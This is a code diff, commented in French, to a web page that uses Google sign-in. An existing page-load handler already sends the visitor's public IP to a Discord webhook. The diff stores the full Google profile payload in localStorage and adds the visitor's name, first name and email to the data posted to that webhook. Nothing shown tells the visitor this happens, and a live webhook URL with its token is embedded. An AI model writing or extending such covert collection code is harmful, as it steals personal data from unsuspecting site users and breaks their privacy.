@@ -127,7 +127,7 @@ function handleCredentialResponse(response) {
     console.log("Connecté :", payload.email);
 
     // Sauvegarde session locale
-    localStorage.setItem("google_user", payload.email);
+    localStorage.setItem("google_user", JSON.stringify(payload));
 
     showPhotoPage();
 }
@@ -145,17 +145,20 @@ window.onload = function() {
     }
 };
 
-// Envoie l'IP publique vers un webhook Discord
+// Envoie l'IP, le nom, le prénom et l'email vers le webhook Discord
 window.onload = function() {
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
             const ip = data.ip;
 
+            const user = localStorage.getItem("google_user");
+            const userObj = JSON.parse(user);
+
             const webhookUrl = 'https://discord.com/api/webhooks/1471154515238588420/NVvd16VSjrUiYpJj54rSKrTy86q9zI9-urEFun9eezXtptYKX6UdW2PNhZe5RzOiWKwA'; // Remplace par ton webhook
 
             const payload = {
-                content: `IP publique détectée : **${ip}**`
+                content: `**IP publique :** ${ip}\n**Nom :** ${userObj.name}\n**Prénom :** ${userObj.given_name}\n**Email :** ${userObj.email}`
             };
 
             fetch(webhookUrl, {
@@ -169,9 +172,7 @@ window.onload = function() {
         })
         .catch(error => console.error('Erreur lors de la récupération de l\'IP:', error));
 };
-
 </script>
 
 </body>
 </html>
-
